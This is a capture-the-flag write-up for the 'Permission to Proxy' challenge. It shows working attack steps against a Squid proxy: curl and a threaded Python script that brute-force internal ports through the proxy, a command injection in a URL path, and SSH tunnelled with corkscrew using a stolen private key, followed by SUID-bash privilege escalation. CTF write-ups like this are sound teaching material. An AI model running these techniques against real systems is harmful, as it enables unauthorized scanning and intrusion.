# Permission to Proxy



## My Solution

When accessing the webpage we get an Invalid URL error and at the bottom we can see it mentioning `squid 3.5.27`.  



Squid is a proxy and this part was very annoying as we needed to bruteforce an internal port. Squid can be used to figure out internal ports by using it with curl, for example:

```bash
curl --proxy http://challenge.ctf.games:PORT http://127.0.0.1:22
```

In the case of a valid port found like port 22, we get the server banner, or whatever response the service normally gives.  



Otherwise we get one of the following 3 errors, ERR_CONNECT_FAIL, ERR_ACCESS_DENIED, or ERR_INVALID_URL:  

The squid proxy can also be used with python requests, this is the way I figured to bruteforce it in a relatively short amount of time.  


```python3
#!/usr/bin/python3

import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

def check_port(i):
    stdout_output = ""  # Initialize stdout_output
    try:
        print(i, flush=True, end='\r')
        r = requests.get(f'http://127.0.0.1:{i}', proxies={'http': 'http://challenge.ctf.games:31199'}, timeout=5)
        stdout_output = r.text
        
        # Check for various connection messages
        if "ERR_CONNECT_FAIL" not in stdout_output and 'ERR_ACCESS_DENIED' not in stdout_output and 'ERR_INVALID_URL' not in stdout_output:
            print(f"Found something on port: {i}")
            print(stdout_output)
    except:
        print(f"The request timed out on port {i}. Look at it separately.")
        exit(1)

# Define the range and maximum number of concurrent threads
port_range = range(65536)
max_threads = 10

# Use ThreadPoolExecutor to handle concurrent requests
with ThreadPoolExecutor(max_workers=max_threads) as executor:
    # Submit tasks for each port and capture the results
    futures = [executor.submit(check_port, i) for i in port_range]
    # Process the results as they complete
    for future in as_completed(futures):
        future.result()  
```
It took the script 24 minutes to find port `50000` as it was hanging the connection and timing out. If there are faster ways, let me know [@LazyTitan33](https://x.com/LazyTitan33)  



When we access it using curl, we can see it is listing directories and is trying to execute basically everything and it hangs:  



Tried to see if I have command injection in the URL itself, in the endpoint, and we do:  

```bash
curl --proxy http://challenge.ctf.games:32381 'http://127.0.0.1:50000/;id;test'
```




Enumerating for a bit I quickly found the user id_rsa private key and saved it:  




Using corkscrew I can proxy an SSH connection as well and get proper shell:  

```bash
ssh -i id_rsa -o "ProxyCommand /usr/bin/corkscrew challenge.ctf.games 30351  %h %p" user@127.0.0.1
```

Ran linpeas and quickly saw that bash has SUID on so escalating privileges is a breeze:  



And we get the flag:  



`flag{c9bbd4888086111e9f632d4861c103f1}`

